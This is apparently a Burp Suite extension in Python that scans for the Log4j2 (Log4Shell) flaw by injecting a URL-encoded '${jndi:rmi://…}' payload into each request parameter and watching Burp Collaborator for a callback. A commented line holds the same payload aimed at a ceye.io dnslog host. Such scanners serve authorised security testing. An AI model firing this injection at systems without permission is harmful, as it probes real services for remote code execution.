from burp import IBurpExtender
from burp import IScannerCheck
from burp import IBurpCollaboratorClientContext
from burp import IScanIssue
from java.io import PrintWriter
from array import array
import requests
import re

class BurpExtender(IBurpExtender, IScannerCheck, IBurpCollaboratorClientContext):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     Log4j2 RCE Scan")
        print("[+]     Author: hackerhack")
        print("[+]     Email:  hackerhack@qq.com")
        print("[+]     Blog:   https://www.yuque.com/hackerhack")
        print("[+] #####################################\r\n\r\n")
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("Log4j2 RCE Scan")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        # load Burp's CollaboratorClient, use generatePayload() method to creat a dnslog address
        self.collaboratorContext = callbacks.createBurpCollaboratorClientContext()
        self.payload = self.collaboratorContext.generatePayload(True)
        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)

    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def doPassiveScan(self, baseRequestResponse):
        request = baseRequestResponse.getRequest()
        reqParameters = self._helpers.analyzeRequest(request).getParameters()

        for parameter in reqParameters:
            parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()
            
            parameterValueRCE = '%24%7Bjndi%3Armi%3A%2F%2F'+ str(self.payload) +'%2F1%7D'
            #parameterValueRCE = '${jndi:rmi://'+ str(randomStr) + '.63lhuf.ceye.io/1}'
            newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)
            newRequest = self._helpers.updateParameter(request, newParameter)
            res = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),newRequest)
            if self.collaboratorContext.fetchCollaboratorInteractionsFor(self.payload):
                print "Found Vuln!!!"
                return [CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
                    "Log4j2 JNDI",
                    'Vuln Parameter is {} \n Recvieved data from: {}'.format(str(parameterName),str(self.payload)),
                    "High")]
        
        

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getUrl() == newIssue.getUrl():
            return -1

        return 0

#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
